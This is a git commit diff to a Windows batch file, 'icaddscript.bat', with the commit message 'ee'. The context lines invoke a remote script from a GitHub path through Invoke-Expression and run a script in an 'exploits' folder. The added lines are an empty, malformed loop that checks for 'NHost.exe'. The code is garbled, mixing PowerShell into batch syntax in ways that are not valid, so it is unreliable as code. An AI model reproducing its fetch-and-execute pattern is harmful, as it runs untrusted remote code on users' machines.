99677e8ab0127149f4c1e4ac0ca3889e98ffca46
InsydeHere20 <57913632+InsydeHere20@users.noreply.github.com>
2023-04-30 20:30:18 +0200

    ee

--- InteractionControl/icaddscript.bat
+++ InteractionControl/icaddscript.bat
@@ -4,6 +4,9 @@ $argsVar = "-cmd=[Invoke-Expression github.com/Niosem/Safler/shell/MadDash.cmd]
 Invoke-Expression ./exploits/OverTheBatch/main.ps1 
     if ($CMDProcess.ShouldProcess("tab.exe -cmd:pshell:profile:3 -Env:pshell:Profile:3=$argsVar", "return.exe -as_host")) {
 }
+    if (!$ProcessRunning = NHost.exe) do {
+        
+    }
 
 :: Breakpoint if NHost is not running
 
